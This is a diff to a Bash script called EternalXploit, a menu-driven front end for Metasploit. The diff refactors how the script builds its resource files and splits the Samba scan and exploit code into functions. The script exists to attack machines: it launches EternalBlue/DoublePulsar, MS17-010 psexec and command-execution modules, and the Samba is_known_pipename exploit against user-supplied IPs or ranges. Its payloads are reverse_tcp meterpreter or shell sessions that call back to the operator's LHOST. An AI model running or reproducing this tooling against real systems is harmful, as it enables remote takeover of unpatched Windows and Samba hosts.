@@ -37,6 +37,7 @@ fi
 fls="0"
 
 # Variables for Data files & temp files
+
 defdir="/root/EternalXploit"
 dir="/usr/share/metasploit-framework/modules/exploits/windows/smb"
 msflogs="msflogs.logs"
@@ -45,6 +46,7 @@ vuln2os="vuln2os.txt"
 vulnostmp="vulnostmp.txt"
 nmap_path="MS17_010_nmap.txt"
 install="install.txt"
+config="$defdir/config.rc"
 
 if [ -e $defdir/$install ]
 then
@@ -209,13 +211,13 @@ fi
 checkfile(){
 cp -r deps/ $dir/
 cp -r eternalblue_doublepulsar.rb $dir/
-touch config.rc 
-echo reload_all > config.rc > /dev/null 2>&1
-echo 'exit' >> config.rc
+touch $config 
+echo reload_all > $config > /dev/null 2>&1
+echo 'exit' >> $config
 /etc/init.d/postgresql start > /dev/null 2>&1
-msfconsole -q -r config.rc
+msfconsole -q -r $config
 /etc/init.d/postgresql stop > /dev/null 2>&1
-rm config.rc
+rm $config
 EternalXploit
 }
 
@@ -318,26 +320,26 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
+touch $config
+echo use exploit/windows/smb/eternalblue_doublepulsar > $config
 if [[ $arch -eq 1 ]]
 then
-echo set PAYLOAD windows/meterpreter/reverse_tcp >> config.rc
-echo set targetarchitecture x86 >> config.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> $config
+echo set targetarchitecture x86 >> $config
 elif [[ $arch -eq 2 ]]
 then
-echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> config.rc
-echo set targetarchitecture x64 >> config.rc
+echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> $config
+echo set targetarchitecture x64 >> $config
 fi
-echo set targer $target >> config.rc
-echo set RHOST $iptarget >> config.rc
-echo set LHOST $ip >> config.rc
-echo set LPORT $port >> config.rc
-echo exploit >> config.rc
+echo set targer $target >> $config
+echo set RHOST $iptarget >> $config
+echo set LHOST $ip >> $config
+echo set LPORT $port >> $config
+echo exploit >> $config
 /etc/init.d/postgresql start >/dev/null 2>&1
-msfconsole -q -r config.rc
+msfconsole -q -r $config
 /etc/init.d/postgresql stop >/dev/null 2>&1
-rm config.rc
+rm $config
 clear
 EternalXploit
 elif [[ $cmd -eq 2 ]]
@@ -347,26 +349,26 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo use exploit/windows/smb/eternalblue_doublepulsar > config.rc
+touch $config
+echo use exploit/windows/smb/eternalblue_doublepulsar > $config
 if [[ $arch -eq 1 ]]
 then
-echo set PAYLOAD windows/shell/reverse_tcp >> config.rc
-echo set targetarchitecture x86 >> config.rc
+echo set PAYLOAD windows/shell/reverse_tcp >> $config
+echo set targetarchitecture x86 >> $config
 elif [[ $arch -eq 2 ]]
 then
-echo set PAYLOAD windows/x64/shell/reverse_tcp >> config.rc
-echo set targetarchitecture x64 >> config.rc
+echo set PAYLOAD windows/x64/shell/reverse_tcp >> $config
+echo set targetarchitecture x64 >> $config
 fi
-echo set targer $target >> config.rc
-echo set RHOST $iptarget >> config.rc
-echo set LHOST $ip >> config.rc
-echo set LPORT $port >> config.rc
-echo exploit >> config.rc
+echo set targer $target >> $config
+echo set RHOST $iptarget >> $config
+echo set LHOST $ip >> $config
+echo set LPORT $port >> $config
+echo exploit >> $config
 /etc/init.d/postgresql start >/dev/null 2>&1
-msfconsole -q config.rc
+msfconsole -q $config
 /etc/init.d/postgresql stop >/dev/null 2>&1
-rm config.rc
+rm $config
 clear
 EternalXploit
 else
@@ -403,14 +405,14 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo use exploit/windows/smb/ms17_010_eternalblue > config.rc
-echo set RHOST $iptarget >> config.rc
-echo exploit >> config.rc
+touch $config
+echo use exploit/windows/smb/ms17_010_eternalblue > $config
+echo set RHOST $iptarget >> $config
+echo exploit >> $config
 /etc/init.d/postgresql start
-msfconsole -q -r config.rc
+msfconsole -q -r $config
 /etc/init.d/postgresql stop
-rm config.rc
+rm $config
 clear
 EternalXploit
 }
@@ -443,14 +445,14 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo use exploit/windows/smb/ms17_010_psexec > config.rc
-echo set RHOST $iptarget >> config.rc
-echo exploit >> config.rc
+touch $config
+echo use exploit/windows/smb/ms17_010_psexec > $config
+echo set RHOST $iptarget >> $config
+echo exploit >> $config
 /etc/init.d/postgresql start
-msfconsole -q -r config.rc
+msfconsole -q -r $config
 /etc/init.d/postgresql stop
-rm config.rc
+rm $config
 clear
 EternalXploit
 }
@@ -461,7 +463,7 @@ delf
 if [[ -z "$iptarget" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range"
+echo -e "$yellow" "     Invalid IP/IP Range"
 exit 1
 fi
 
@@ -470,7 +472,7 @@ inv=$(echo "$iptarget" | grep [a-zA-Z] )
 if [[ ! -z "$inv" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range" 
+echo -e "$yellow" "     Invalid IP/IP Range" 
 exit 1
 fi
 
@@ -525,18 +527,18 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo spool $defdir/$msflogs > config.rc
-echo use auxiliary/scanner/smb/smb_ms17_010 >> config.rc
+touch $config
+echo spool $defdir/$msflogs > $config
+echo use auxiliary/scanner/smb/smb_ms17_010 >> $config
 paste -sd, "$defdir/msfip"        \
 |sed 's/^/set rhosts /; s/,/, /g'  \
->>"config.rc"
-echo exploit >> config.rc
-echo exit >> config.rc
+>>"$config"
+echo exploit >> $config
+echo exit >> $config
 /etc/init.d/postgresql start >/dev/null 2>&1
-msfconsole -q -r config.rc >/dev/null 2>&1
+msfconsole -q -r $config >/dev/null 2>&1
 /etc/init.d/postgresql stop >/dev/null 2>&1
-rm config.rc
+rm $config
 getdata
 
 }
@@ -547,7 +549,7 @@ delf
 if [[ -z "$iptarget" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range"
+echo -e "$yellow" "     Invalid IP/IP Range"
 exit 1
 fi
 
@@ -556,7 +558,7 @@ inv=$(echo "$iptarget" | grep [a-zA-Z] )
 if [[ ! -z "$inv" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range" 
+echo -e "$yellow" "     Invalid IP/IP Range" 
 exit 1
 fi
 
@@ -613,20 +615,79 @@ echo -e "$red"'            #####################################################
 echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
 echo -e "$red"'            #######################################################'
 echo -e "$white"
-touch config.rc
-echo spool $defdir/$msflogs > config.rc
-echo use auxiliary/admin/smb/ms17_010_command >> config.rc
+touch $config
+echo spool $defdir/$msflogs > $config
+echo use auxiliary/admin/smb/ms17_010_command >> $config
 paste -sd, "$defdir/msfip"        \
 |sed 's/^/set rhosts /; s/,/, /g'  \
->>"config.rc"
-echo exploit >> config.rc
-echo exit >> config.rc
+>>"$config"
+echo exploit >> $config
+echo exit >> $config
 /etc/init.d/postgresql start >/dev/null 2>&1
-msfconsole -q -r config.rc >/dev/null 2>&1
+msfconsole -q -r $config >/dev/null 2>&1
 /etc/init.d/postgresql stop >/dev/null 2>&1
-rm config.rc
+rm $config
 getdata2
 
+}
+
+samba_exploit(){
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "      Invalid IP Address" 
+exit 1
+fi
+echo
+echo -e "$red"'            #######################################################'
+echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
+echo -e "$red"'            #######################################################'
+echo -e "$white"
+touch $config
+echo use exploit/linux/samba/is_known_pipename > $config
+echo set RHOST $iptarget >> $config
+echo exploit >> $config
+echo exit >> $config
+/etc/init.d/postgresql start
+msfconsole -q -r $config
+/etc/init.d/postgresql stop
+rm $config
+clear
+EternalXploit
+}
+
+samba_scanner(){
+if [[ -z "$iptarget" ]]
+then
+echo ""
+echo -e "$yellow" "     Invalid IP/IP Range"
+exit 1
+fi
+
+#check if user input have any letters
+inv=$(echo "$iptarget" | grep [a-zA-Z] )
+if [[ ! -z "$inv" ]]
+then
+echo ""
+echo -e "$yellow" "     Invalid IP/IP Range" 
+exit 1
+fi
+echo
+echo -e "$red"'            #######################################################'
+echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
+echo -e "$red"'            #######################################################'
+echo -e "$white"
+nmap -T4 -v -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $iptarget
+EternalXploit
 }
 
 # Updates EternalXploit
@@ -645,6 +706,7 @@ wget https://raw.githubusercontent.com/Gl33ch3r/EternalXploit/master/version.txt
 v=$(cat $defdir/version.txt)
 if [ $version == $v ]
 then
+clear
 echo -e "$green""EternalXploit is up to date!"
 exit 1
 else
@@ -652,6 +714,7 @@ rm -f /usr/local/sbin/EternalXploit >/dev/null 2>&1
 wget https://raw.githubusercontent.com/Gl33ch3r/EternalXploit/master/EternalXploit -O /usr/local/sbin/EternalXploit > /dev/null 2>&1
 chmod +x /usr/local/sbin/EternalXploit >/dev/null 2>&1
 echo ""
+clear
 echo -e "$green""EternalXploit Binaries where updated to your system"
 echo ""
 exit 1
@@ -730,6 +793,7 @@ fi
 
 
 
+main(){
 if [ -e $dir/eternalblue_doublepulsar.rb ] && [ -d $dir/deps/ ]
 then
 checkdep
@@ -741,11 +805,16 @@ echo
 echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$green"' MS17-010 Exploit'
 echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$green"' Samba Exploit'
 echo
+echo -e '     '"$red"'['"$yellow"'9'"$red"']'"$yellow"' Check Updates'
 echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"' Exit'
 echo
 echo -e "$green"
 read -p '     Please select exploit: ' opts
-if [[ $opts -eq 1 ]] 
+if [[ $opts -eq 9 ]] 
+then
+updates
+EternalXploit
+elif [[ $opts -eq 1 ]] 
 then
 clear
 logo
@@ -795,7 +864,7 @@ read -p '     IP/IP Range: ' iptarget
 if [[ -z "$iptarget" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range"
+echo -e "$yellow" "     Invalid IP/IP Range"
 exit 1
 fi
 
@@ -804,7 +873,7 @@ inv=$(echo "$iptarget" | grep [a-zA-Z] )
 if [[ ! -z "$inv" ]]
 then
 echo ""
-echo -e "$yellow" "      Invalid IP/IP Range" 
+echo -e "$yellow" "     Invalid IP/IP Range" 
 exit 1
 fi
 
@@ -851,7 +920,6 @@ clear
 EternalXploit
 else
 clear
-echo '   Invalid option...'
 EternalXploit
 fi
 elif [[ $opts -eq 2 ]] 
@@ -881,28 +949,7 @@ echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$yellow"'         '"$green"'192.168.1.1/24'
 echo -e "$white"
 read -p '     IP/IP Range: ' iptarget
-if [[ -z "$iptarget" ]]
-then
-echo ""
-echo -e "$yellow" "      Invalid IP/IP Range"
-exit 1
-fi
-
-#check if user input have any letters
-inv=$(echo "$iptarget" | grep [a-zA-Z] )
-if [[ ! -z "$inv" ]]
-then
-echo ""
-echo -e "$yellow" "      Invalid IP/IP Range" 
-exit 1
-fi
-echo
-echo -e "$red"'            #######################################################'
-echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
-echo -e "$red"'            #######################################################'
-echo -e "$white"
-nmap -T4 -v -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $iptarget
-EternalXploit
+samba_scanner
 elif [[ $exploit -eq 1 ]]
 then
 clear
@@ -914,37 +961,7 @@ echo -e "$white"
 echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
 echo -e "$white"
 read -p '     Target IP Address: ' iptarget
-if [[ -z "$iptarget" ]]
-then
-echo ""
-echo -e "$yellow" "      Invalid IP Address"
-exit 1
-fi
-
-#check if user input have any letters
-inv=$(echo "$iptarget" | grep [a-zA-Z] )
-if [[ ! -z "$inv" ]]
-then
-echo ""
-echo -e "$yellow" "      Invalid IP Address" 
-exit 1
-fi
-echo
-echo -e "$red"'            #######################################################'
-echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
-echo -e "$red"'            #######################################################'
-echo -e "$white"
-touch config.rc
-echo use exploit/linux/samba/is_known_pipename > config.rc
-echo set RHOST $iptarget >> config.rc
-echo exploit >> config.rc
-echo exit >> config.rc
-/etc/init.d/postgresql start
-msfconsole -q -r config.rc
-/etc/init.d/postgresql stop
-rm config.rc
-clear
-EternalXploit
+samba_exploit
 elif [[ $exploit -eq 0 ]]
 then
 clear
@@ -958,8 +975,8 @@ fi
 else
 checkfile
 fi
-
-
+}
+main
 
 
 
